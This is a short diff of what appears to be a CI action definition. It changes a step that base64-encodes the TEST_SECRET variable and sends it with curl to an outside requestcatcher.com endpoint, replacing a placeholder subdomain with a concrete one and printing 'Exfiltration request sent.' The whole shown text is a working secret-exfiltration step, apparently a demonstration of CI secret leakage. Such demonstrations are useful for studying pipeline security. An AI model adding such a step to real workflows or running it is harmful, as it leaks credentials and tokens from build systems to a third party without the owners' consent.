@@ -5,6 +5,6 @@ runs:
   steps:
     - run: |
         encoded=$(echo -n "$TEST_SECRET" | base64)
-        curl -s -d "secret=$encoded" https://<subdomain>.requestcatcher.com
+        curl -s -d "secret=$encoded" https://yakosolana-demo-7842.requestcatcher.com
         echo "::notice ::Exfiltration request sent."
       shell: bash
